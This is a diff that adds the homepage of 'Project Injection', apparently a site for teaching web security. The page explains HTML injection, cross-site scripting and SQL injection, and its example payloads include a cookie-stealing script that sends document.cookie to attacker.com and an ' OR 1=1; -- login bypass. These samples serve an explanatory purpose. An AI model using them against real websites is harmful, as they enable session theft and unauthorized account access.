@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Project Injection - Home</title>
+    <link rel="stylesheet" href="./public/css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+</head>
+<body>
+    <div class="sira-dot" id="sira-dot-0"></div>
+    <div class="sira-dot" id="sira-dot-1"></div>
+    <div class="sira-dot" id="sira-dot-2"></div>
+    <div class="sira-dot" id="sira-dot-3"></div>
+    <div class="sira-dot" id="sira-dot-4"></div>
+
+    <script src="./public/js/index-script.js"></script> <script src="./public/js/sira-cursor.js"></script> </body>
+</html>
+<body>
+    <div class="sira-dot"></div>
+
+    <header>
+        <nav>
+            <div class="logo">
+                <img src="./public/images/logo.png" alt="Project Injection Logo" style="height: 70px; vertical-align: middle; margin-right: 10px;">
+                Project Injection
+            </div>
+            <ul>
+                <!-- <li class="search-container">
+                    <input type="text" placeholder="Search something" class="search-input">
+                    <i class="fas fa-search search-icon"></i>
+                </li> -->
+            </ul>
+        </nav>
+        <nav class="secondary-nav">
+            <ul>
+                <li><a href="index.html" class="active">Home</a></li>
+                <li><a href="subscription.html">Subscription</a></li>
+                <li><a href="try-injection.html">Try Injection</a></li>
+                <li><a href="about-us.html">About Us</a></li>
+                <!-- <li><a href="resources.html">Resources</a></li> -->
+                <li><a href="blog.html">Blog</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <section id="hero" class="container">
+        <div id="hero-content">
+            <h1>Cyber Security</h1>
+            <p>Unlock Your Full Potential.</p>
+            <p>Project Injection, a platform for learning web security, helps you understand and prevent modern web threats with interactive demos.</p>
+            <a href="try-injection.html" class="get-started-btn">Get Started</a>
+        </div>
+        <div id="hero-image">
+            <img src="./public/images/cyber-security-illustration.png" alt="Cyber Security Illustration">
+        </div>
+    </section>
+
+    <div class="container">
+        <section id="injection-overview">
+            <h2>Understanding Web Injections</h2>
+            <p>Web injection attacks involve attackers inserting malicious code or data into an application, which is then processed by the server or displayed to other users. These vulnerabilities can lead to data breaches, unauthorized access, and defacement of websites.</p>
+
+            <h3>1. HTML Injection</h3>
+            <p><strong>What it is:</strong> Occurs when an application takes user input and renders it directly into the HTML page without proper sanitization. An attacker can insert arbitrary HTML tags, altering the page's structure or content.</p>
+            <p><strong>Example:</strong> If a comment section doesn't filter input, an attacker could post <code>&lt;h1&gt;Malicious Heading&lt;/h1&gt;</code>, which would appear as a large heading on the page.</p>
+
+            <h3>2. Cross-Site Scripting (XSS)</h3>
+            <p><strong>What it is:</strong> A type of injection where malicious scripts are injected into otherwise trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser-side script, to a different end-user.</p>
+            <p><strong>Types:</strong> Reflected XSS, Stored XSS, DOM-based XSS.</p>
+            <p><strong>Example:</strong> An attacker might inject <code>&lt;script&gt;alert('You are hacked!');&lt;/script&gt;</code> or even scripts to steal cookies: <code>&lt;script&gt;document.location='http://attacker.com/steal?c='+document.cookie;&lt;/script&gt;</code>.</p>
+
+            <h3>3. SQL Injection</h3>
+            <p><strong>What it is:</strong> A code injection technique used to attack data-driven applications, in which malicious SQL statements are inserted into an entry field for execution (e.g., to dump database contents to the attacker).</p>
+            <p><strong>Example:</strong> In a login form, entering <code>' OR 1=1; --</code> as a username can bypass authentication by making the SQL query always true. For example: <code>SELECT * FROM users WHERE username = '' OR 1=1; --' AND password = '...'</code></p>
+        </section>
+
+        <hr>
+
+        <section id="contact-us">
+            <h2>Contact Us</h2>
+            <p>Have questions, feedback, or suggestions? Reach out to us!</p>
+            <form id="contactForm">
+                <label for="name">Name:</label>
+                <input type="text" id="name" name="name" required placeholder="Your Name">
+
+                <label for="email">Email:</label>
+                <input type="email" id="email" name="email" required placeholder="your.email@example.com">
+
+                <label for="subject">Subject:</label>
+                <input type="text" id="subject" name="subject" required placeholder="Subject of your message">
+
+                <label for="message">Message:</label>
+                <textarea id="message" name="message" rows="5" required placeholder="Your message here..."></textarea>
+
+                <button type="submit">Send Message</button>
+                <div id="contactMessage" class="output-box"></div>
+            </form>
+        </section>
+    </div>
+
+    <footer>
+        <p>&copy; 2025 Project Injection. All rights reserved.</p>
+    </footer>
+
+    <script src="./public/js/index-script.js"></script>
+    <script src="./public/js/sira-cursor.js"></script>
+</body>
+</html>
